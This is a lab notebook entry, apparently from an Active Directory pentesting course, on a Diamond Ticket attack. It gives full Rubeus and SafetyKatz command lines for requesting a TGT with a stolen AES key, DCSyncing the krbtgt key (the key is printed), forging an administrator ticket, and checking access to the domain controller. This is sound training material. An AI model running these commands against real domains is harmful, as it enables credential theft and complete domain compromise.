
> [!INFO] Learning objectives
> 1. Use Domain Admin Privileges obtained earlier to execute Diamond ticket attack

> [!NOTE] 
> In questa parte del laboratorio si passa dall'accesso con un account privilegiato alla compromissione del **secret dell'account `krbtgt`**, fondamentale per Kerberos in Active Directory. 


# 1. Extract `krbtgt` secret

> [!warning] HINTS
> We should distinguish the sensitive `krbtgt` key from keys belonging to ordinary users or individual services. 
> 
> They protect different Kerberos ticket types and imply different scopes of risk.


In this case it's very easy because we need just `kbrtgt` user `secret` and we are done.

We now we can extract it sice we have done in golden ticket attack.

First of all we need to get the access to `svcadmin`:
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
  

## 3.1 DCSync


> [!warning] HINTS
> The critical prerequisite to understand is permission to replicate directory secrets. 
> 
> A successful DCSync request indicates far-reaching access to authentication material even when the requesting process is not running directly on the DC.


The next step is: extract the `krbtgt` account tickets leveraging on `srvadmin` privileges.

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
- this command works because we have a ticket in our shell for `svcadmin`, so these network requests are done by `svcadmin`
- ![[Pasted image 20261124113711.png]]
- `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` is the `aes256 of krbtgt`


# 3.2 forge diamond ticket

> [!warning] HINTS
> A Diamond Ticket modifies an existing legitimate TGT, whereas a Golden Ticket is constructed using `krbtgt` key material. 
> 
> We should keep these concepts separate when interpreting lab output and troubleshooting authentication.


```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
- ![[Pasted image 20261124114917.png]]

>[!warning]  **AcquireCredentialsHandle error:, Unable to retrieve TGT using tgtdeleg**
>To solve the problem you just need to logoff and login again


Now just test:
```powershell
winrs -r:dcorp-dc cmd
set username
```


